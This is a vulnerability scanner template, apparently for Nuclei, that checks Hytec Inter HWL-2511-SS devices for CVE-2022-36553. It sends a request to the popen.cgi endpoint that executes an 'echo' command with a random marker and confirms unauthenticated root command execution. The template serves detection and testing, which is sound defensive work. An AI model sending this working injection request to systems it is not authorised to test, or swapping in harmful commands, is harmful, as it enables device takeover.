id: cve-2022-36553
info:
  name: HWL-2511-SS popen.cgi Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Hytec Inter HWL-2511-SS v1.05 and earlier has a vulnerability that allows attackers to execute arbitrary commands with root privileges via the CLI. This template checks for command execution via the popen.cgi endpoint.
  reference:
    - https://gist.github.com/Nwqda/b27418ab801eb0b9cdbe8d042cb0249b
  classification:
    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.8
    cve-id: CVE-2022-36553
  tags: command-execution

variables:
  marker: "{{rand_text_alphanumeric(16)}}"

http:
  - raw:
      - |
        GET /cgi-bin/popen.cgi?command=echo {{marker}} HTTP/1.1
        Host: {{Hostname}}
        Connection: close
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{marker}}"
        part: body
      - type: word
        negative: true
        words:
          - "echo"
        part: body
